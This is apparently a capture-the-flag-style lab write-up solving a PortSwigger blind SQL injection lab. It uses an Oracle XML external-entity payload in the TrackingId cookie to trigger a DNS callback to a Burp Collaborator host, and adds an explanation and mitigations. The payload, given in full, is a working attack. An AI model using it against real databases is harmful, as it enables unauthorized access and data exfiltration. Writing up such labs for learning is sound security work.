# Blind SQL Injection with Out-of-Band Interaction

## Lab Information

| Category | SQL Injection |
|---|---|
| Lab Name | Blind SQL injection with out-of-band interaction |
| Difficulty | Practitioner |
| Platform | PortSwigger Web Security Academy |

---

# Description

This lab demonstrates a Blind SQL Injection vulnerability using Out-of-Band (OAST) interaction techniques.

Unlike traditional SQL Injection vulnerabilities:
- the application did not display database errors
- no query results were visible
- no response differences existed
- no time delays were observable

Instead, the attacker used Burp Suite Collaborator to detect external interactions triggered by the database server.

The vulnerable injection point was located inside the `TrackingId` cookie.

Using a specially crafted Oracle XML payload, the attacker forced the backend database to make an external DNS request to a Burp Collaborator server.

The successful DNS interaction confirmed that arbitrary SQL commands were executed on the backend database.

---

# Vulnerability Type

- Blind SQL Injection (Blind SQLi)
- Out-of-Band SQL Injection (OAST)
- Oracle SQL Injection

---

# Impact

An attacker can exploit backend SQL Injection vulnerabilities even when:
- errors are hidden
- responses remain unchanged
- time delays are unavailable

This may lead to:
- database enumeration
- remote data exfiltration
- server-side request triggering
- sensitive data extraction
- complete database compromise

Out-of-Band SQL Injection is extremely dangerous because it bypasses normal detection limitations.

---

# Steps to Reproduce

1. Open the target application.
2. Navigate to the **Gifts** category.
3. Capture the request using Burp Suite.
4. Identify the vulnerable `TrackingId` cookie.
5. Using the PortSwigger SQL Injection cheat sheet, craft the following payload:

```sql
TrackingId=' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://7ltogvyl58zc3oeq7utznq6z9qfh37rw.oastify.com/"> %remote;]>'),'/l') FROM dual--;
```

6. Send the modified request.
7. Open Burp Suite Collaborator.
8. Observe that a DNS interaction is received from the backend server.
9. Confirm successful Out-of-Band SQL Injection.
10. The lab gets successfully solved.

---

# Proof of Concept (PoC)

## Step 1 — Accessing the Main Website

The application initially appeared to be a normal e-commerce website containing the **Gifts** category filter.

![Main Website](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Out-of-Band%20Interaction/screenshots/lab12.png?raw=true)

**Caption:** Initial application interface containing the Gifts category filter.

---

## Step 2 — Capturing the Request

The Gifts category request was intercepted using Burp Suite.

During inspection, the vulnerable `TrackingId` cookie was identified.

![Captured Request](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Out-of-Band%20Interaction/screenshots/lab12(1).png?raw=true)

**Caption:** Capturing the request and identifying the vulnerable TrackingId cookie.

---

## Step 3 — Injecting the Out-of-Band Payload

Using the PortSwigger SQL Injection cheat sheet, the following Oracle payload was crafted and modified:

```sql
TrackingId=' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://7ltogvyl58zc3oeq7utznq6z9qfh37rw.oastify.com/"> %remote;]>'),'/l') FROM dual--;
```

This payload forced the Oracle database to:
- parse malicious XML
- load an external entity
- send a DNS request to the Burp Collaborator domain

![Payload Injection](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Out-of-Band%20Interaction/screenshots/lab12(2).png?raw=true)

**Caption:** Injecting an Out-of-Band SQL Injection payload through the TrackingId cookie.

---

## Step 4 — Receiving the DNS Interaction

After sending the payload, Burp Suite Collaborator captured an incoming DNS request from the backend server.

This confirmed that:
- the SQL Injection payload executed successfully
- the backend server attempted an external network interaction
- the application was vulnerable to Out-of-Band SQL Injection

The lab was solved successfully.

![Collaborator Interaction](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Out-of-Band%20Interaction/screenshots/lab12(3).png?raw=true)

**Caption:** DNS interaction captured through Burp Suite Collaborator confirming successful SQL Injection.

---

# Why It Works

The application directly inserted user-controlled cookie data into backend SQL queries without proper sanitization.

The payload abused Oracle XML functionality:

```sql
EXTRACTVALUE(xmltype(...))
```

and external XML entities:

```xml
<!ENTITY % remote SYSTEM "http://attacker-domain">
```

This caused the database server to:
1. process malicious XML
2. resolve the external entity
3. make a DNS request to the attacker-controlled domain

The DNS interaction was captured by Burp Suite Collaborator, confirming successful SQL Injection execution.

---

# Understanding Out-of-Band (OAST) SQL Injection

## Simple Meaning

Out-of-Band SQL Injection means:

> "The attacker receives results through a different communication channel instead of the normal website response."

Instead of:
- error messages
- visible output
- delayed responses

the database communicates externally using:
- DNS requests
- HTTP requests

---

## Why It Was Needed in This Lab

This application:
- did not show database errors
- did not change responses
- did not allow timing attacks

So the attacker needed another way to confirm SQL execution.

Burp Collaborator acted like a listener:
- if the database contacted the Collaborator server
- it confirmed that the injected SQL payload worked successfully

---

# Security Risk

This vulnerability can result in:
- external data exfiltration
- server-side request forgery behavior
- database enumeration
- remote interaction with attacker-controlled infrastructure
- complete database compromise

Out-of-Band SQL Injection vulnerabilities are highly dangerous because they can bypass traditional detection methods.

---

# Recommended Mitigation

- Use parameterized queries (prepared statements).
- Never concatenate user input into SQL queries.
- Disable unnecessary XML external entity functionality.
- Restrict outbound network access from database servers.
- Apply strict input validation.
- Restrict database permissions using least privilege principles.

---

# Learning Section

## What I Learned

- Blind SQL Injection can use external network interactions for detection.
- Burp Suite Collaborator helps detect Out-of-Band vulnerabilities.
- Oracle XML functions can trigger external entity requests.
- OAST attacks work even when no errors or response differences exist.
- External DNS interactions can confirm successful SQL Injection execution.

---

# Tools Used

- Burp Suite
- Burp Collaborator
- Burp Repeater
- Firefox Developer Tools
- PortSwigger Web Security Academy
- PortSwigger SQL Injection Cheat Sheet

---

# Conclusion

This lab demonstrated a Blind SQL Injection vulnerability using Out-of-Band interaction techniques through the `TrackingId` cookie.

By abusing Oracle XML functionality and Burp Suite Collaborator, the backend database was forced to generate an external DNS request, successfully confirming arbitrary SQL execution without relying on visible errors or response differences.
